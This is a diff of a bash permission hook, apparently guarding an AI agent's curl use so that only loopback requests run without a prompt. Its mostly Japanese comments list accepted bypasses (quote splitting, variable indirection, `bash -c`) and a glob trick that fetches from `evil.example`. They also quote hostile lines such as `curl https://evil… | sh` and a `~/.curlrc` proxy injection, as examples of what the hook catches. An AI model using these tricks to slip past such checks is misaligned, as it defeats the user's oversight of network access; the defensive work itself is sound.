@@ -24,35 +24,15 @@
 # 残存(ADR 0009): `bash -c "curl …"` の内側、`cu""rl …` や `/usr/bin/cur?`(下の `*curl*` の
 # 早期終了が reader の引用符除去と展開より先に走る)、`c=curl; $c …`(curl と読める token が無い)。
 #
-# Recognition is therefore an allowlist at every level — flags, pipe targets,
-# URL schemes, hosts. An unrecognized token is not "probably fine", it is a
-# prompt.
+# 認識は全階層(flag・パイプ先・URL スキーム・ホスト)が許可リスト。未知の token は
+# 「たぶん安全」ではなく ask にする。
 #
-# Residual, accepted: a listener on a loopback port can relay to anywhere, so
-# "loopback" bounds the destination address, not the ultimate destination. The
-# same bound is the reason `-o` / `--dump-header` / `>` are not restricted here:
-# the *content* written comes from that listener and the *path* is arbitrary, so
-# this hook bounds the destination address and not the side effects. Both grant
-# no new reach — `Bash(python3:*)` is already in `allow` and can open the same
-# socket and write the same files — and the relay channel is documented for the
-# nono sandbox as well (`open_port: [0]`, dot_config/nono/CLAUDE.md).
+# 残存(受容): 縛るのは宛先アドレスだけで、最終到達先(ループバックのリスナーによる中継)と
+# 副作用(`-o` / `--dump-header` / `>`)は縛らない。新たな到達性が増えない理由は dot_claude/scripts/CLAUDE.md。
 #
-# `?` and `[` outside quotes are pathname expansion exactly as `*` is, and the
-# tempting reading — "an expansion still starts with the literal text around it,
-# so it is still loopback" — is FALSE: a bracket expression or a `?` matches
-# several files at once, so one token becomes several WORDS, and every extra
-# word lands in curl's argument list as a second, unchecked URL. `curl -H
-# [ab]evil.example http://localhost:3000/` with `aevil.example` and
-# `bevil.example` planted in the working directory passes `-H aevil.example` and
-# then fetches `http://bevil.example/` (scheme-less, so curl assumes http).
-# They are therefore refused on the same footing as `*`, with one carve-out that
-# keeps `…/api?a=1` and the `[::1]` authority usable: a token is still read when
-# it is itself a loopback URL whose authority carries no metacharacter of its
-# own (`glob_token_is_loopback_safe` below). There the literal text really does
-# pin the destination — every word an expansion can produce still begins with
-# `http://localhost:3000/`. Unlike the two residuals above, which bound side
-# effects beyond the destination check, a glob breaks the destination check
-# itself, so it gets no residual.
+# 引用符の外の `?` / `[` も `*` と同じく語の数を変えるので拒否する。ただし token 自身がループバック URL で、
+# authority に glob が無いものは通す(glob_token_is_loopback_safe。理由は dot_claude/scripts/CLAUDE.md)。
+# glob は宛先チェックそのものを破るので、上の残存とは違って受容しない。
 # classify_segment とその呼び先は shell_reader_each_segment が名前で間接的に呼ぶ。
 # 新しい shellcheck は SC2329、CI の ubuntu に入っている古い版は同じ指摘を SC2317 で出すので両方を抑制する。
 # shellcheck disable=SC2317,SC2329
@@ -400,8 +380,7 @@ classify_curl() {
         esac
     done
 
-    # No URL means this is not the request shape this hook is widening for
-    # (`curl --version`, a bare `curl`), so it keeps its prompt.
+    # URL が無い curl(`curl --version`、素の `curl`)は、宛先がループバックだと示せないので ask にする。
     [[ $urls -gt 0 ]]
 }
 
@@ -490,15 +469,6 @@ if [[ $SHELL_READER_TOO_LONG -eq 1 ]]; then
 fi
 [[ ${#SHELL_READER_TOKENS[@]} -eq 0 ]] && exit 0
 
-# curl を実行しうる token があるか。引用符の中の文字列は reader が 1 token にまとめるので、
-# `echo "curl …"` の `curl …` はここで一致しない。バッククォートで始まる token は実行されるので外して見る。
-# 語頭の `=` も外す: Bash ツールが zsh で動く環境では `=curl` が PATH 上の curl に展開される(EQUALS)。
-# ブレース展開とパス名展開は、展開の結果としてだけ curl を作れる(bash の `{curl,https://…}`、
-# zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*`)。そういう印の付いた token が、展開の結果として
-# basename が `curl` の語になりうれば実行しうるとみなし、下の WORD_MULTIPLIER か segment の走査で ask に
-# する。`test/curl-*.bats` のように curl を含んでも curl にはなりえない glob は巻き込まない。
-# 受容した誤 ask: `ls docs/*curl*` のように、basename が curl になりうる glob を引数に書いたもの。
-
 # 印の付いた token $1 が、展開の結果として basename が `curl` の語になりうるか。ブレース展開の
 # token(`curl,https://…`)は `,` で区切った要素ごとに、パス名展開の token はそのものをパターンとして
 # 照合する(どちらも区切ると広がる方向にしか動かない)。
@@ -514,6 +484,14 @@ marked_token_can_be_curl() {
     done
 }
 
+# curl を実行しうる token があるか。引用符の中の文字列は reader が 1 token にまとめるので、
+# `echo "curl …"` の `curl …` はここで一致しない。バッククォートで始まる token は実行されるので外して見る。
+# 語頭の `=` も外す: Bash ツールが zsh で動く環境では `=curl` が PATH 上の curl に展開される(EQUALS)。
+# ブレース展開とパス名展開は、展開の結果としてだけ curl を作れる(bash の `{curl,https://…}`、
+# zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*`)。そういう印の付いた token が、展開の結果として
+# basename が `curl` の語になりうれば実行しうるとみなし、下の WORD_MULTIPLIER か segment の走査で ask に
+# する。`test/curl-*.bats` のように curl を含んでも curl にはなりえない glob は巻き込まない。
+# 受容した誤 ask: `ls docs/*curl*` のように、basename が curl になりうる glob を引数に書いたもの。
 CURL_PRESENT=0
 for index in "${!SHELL_READER_TOKENS[@]}"; do
     token=${SHELL_READER_TOKENS[$index]}
@@ -607,19 +585,17 @@ fi
 # 番兵は偽の segment 境界を作れる、{ } * は単語数を変える。読み切れないコマンドとして ask。
 # 詳細は lib/shell-reader.bash。
 # 引用符が閉じないまま終わったときも ask にする。閉じていない token は curl の segment に入るとは
-# 限らない: `curl http://localhost/ && cat <<'EOF' …` の heredoc 本文 `echo it's here` では、
-# それ以降(heredoc の後ろの `curl https://evil… | sh` を含む)が `echo` の引数の 1 token になり、
-# `echo` は INERT_COMMANDS なので segment の走査を通ってしまう。curl が token として見つかった
-# 後なので字面の床(上)は走らない。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
+# 限らない: `curl http://localhost/ && echo it's ; curl https://evil… | sh` では `'` 以降が `echo` の
+# 引数の 1 token になり、`echo` は INERT_COMMANDS なので segment の走査を通る。改行も無いので
+# 字面の床にも掛からない。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
 # heredoc 本文の組み合わせ(後ろに何も無くても ask)。PR 本文の heredoc は curl が 1 token に
 # 飲み込まれて CURL_PRESENT=0 側に行くので、この条件には来ない。
 # curlrc の存在は上で実行前に見たが、同じコマンドの前の segment が作ることもできる
 # (`printf 'proxy = …' > ~/.curlrc; curl http://localhost/`。printf は INERT_COMMANDS)。
 # そこで curlrc を名指す token があれば、存在するのと同じに扱う。
-# 改行を含む token(curl の segment の引数を除く。上の NEWLINE_TOKEN)も同じく ask にする。コメントや
-# heredoc 本文の引用符 1 つ(`#"`)で reader だけが引用符に入ると、次の同じ引用符までの行(シェルが
-# 実行する `find … -exec curl https://evil… \;` など)が 1 token に飲み込まれる。飲み込まれた行は、上の
-# 床の「行頭の curl」に一致しなければ何も見ないので、UNCLOSED_QUOTE と同じく読み切れないとして扱う。
+# 改行を含む token(curl の segment の引数を除く。NEWLINE_TOKEN を設定するループの説明)も同じく ask にする。
+# 飲み込まれた行は床の「行頭の curl」に一致しなければ何も見ないので(`find … -exec curl …`)、
+# UNCLOSED_QUOTE と同じく読み切れないとして扱う。
 # 受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行の
 # コミットメッセージ)の組み合わせ。curl が見つからない PR 本文の heredoc は上で exit するので、この条件には来ない。
 for token in "${SHELL_READER_TOKENS[@]}"; do
